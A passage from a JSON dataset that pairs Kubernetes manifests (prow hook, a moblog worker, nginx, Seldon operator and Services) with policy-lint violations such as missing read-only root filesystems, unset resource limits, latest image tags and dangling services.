    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9161",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "9162",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "9163",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9164",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "9165",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "9166",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "9167",
    "manifest_path": "data/manifests/the_stack_sample/sample_3462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: front\n  name: front\nspec:\n  ports:\n  - name: front-p80\n    port: 80\n    targetPort: 80\n  selector:\n    name: front\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:front])"
  },
  {
    "id": "9168",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"worker\" is using an invalid container image, \"moblog-cloud/worker:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9169",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9170",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"worker\" does not have a read-only root file system"
  },
  {
    "id": "9171",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"worker\" is not set to runAsNonRoot"
  },
  {
    "id": "9172",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"worker\" has cpu request 0"
  },
  {
    "id": "9173",
    "manifest_path": "data/manifests/the_stack_sample/sample_3470.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: worker\nspec:\n  selector:\n    matchLabels:\n      app: worker\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: worker\n    spec:\n      containers:\n      - name: worker\n        image: moblog-cloud/worker:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: REDIS_URL\n          valueFrom:\n            secretKeyRef:\n              name: redis\n              key: redis_url\n        - name: BLOG_BUCKET_URL\n          valueFrom:\n            secretKeyRef:\n              name: blog-bucket\n              key: bucket_url\n        command:\n        - /home/worker/worker\n        - -adminServer\n        - http://$(ADMINSERVER_SERVICE_NAME)/api\n        - -gitServer\n        - http://$(GITSERVER_SERVICE_NAME)\n        - -redisJobQueue\n        - $(REDIS_URL)\n        - -themeRepository\n        - https://github.com/abustany/moblog-blog-theme\n        - -workDir\n        - /work\n        - -blogOutput\n        - $(BLOG_BUCKET_URL)\n        volumeMounts:\n        - name: work\n          mountPath: /work\n      volumes:\n      - name: work\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"worker\" has memory limit 0"
  },
  {
    "id": "9174",
    "manifest_path": "data/manifests/the_stack_sample/sample_3472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1218\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9175",
    "manifest_path": "data/manifests/the_stack_sample/sample_3472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1218\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9176",
    "manifest_path": "data/manifests/the_stack_sample/sample_3472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1218\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9177",
    "manifest_path": "data/manifests/the_stack_sample/sample_3472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1218\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9178",
    "manifest_path": "data/manifests/the_stack_sample/sample_3472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1218\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9179",
    "manifest_path": "data/manifests/the_stack_sample/sample_3473.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: mysql-govdb\n  name: mysql-govdb\nspec:\n  ports:\n  - name: mysql-port\n    port: 3306\n  selector:\n    name: mysql-govdb\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:mysql-govdb])"
  },
  {
    "id": "9180",
    "manifest_path": "data/manifests/the_stack_sample/sample_3474.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-1.15\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: '1.15'\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon-1.15\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: '1.15'\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon-1.15\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: '1.15'\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=443\n        - --create-resources=$(CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/engine:1.1.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/seldon-core-executor:1.1.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_GRPC_PORT\n          value: '5001'\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT_PREFIX\n          value: http://default-broker.\n        - name: DEFAULT_USER_ID\n          value: ''\n        image: docker.io/seldonio/seldon-core-operator:1.1.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "9181",
    "manifest_path": "data/manifests/the_stack_sample/sample_3474.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-1.15\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: '1.15'\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon-1.15\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: '1.15'\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon-1.15\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: '1.15'\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=443\n        - --create-resources=$(CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: docker.io/seldonio/engine:1.1.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: 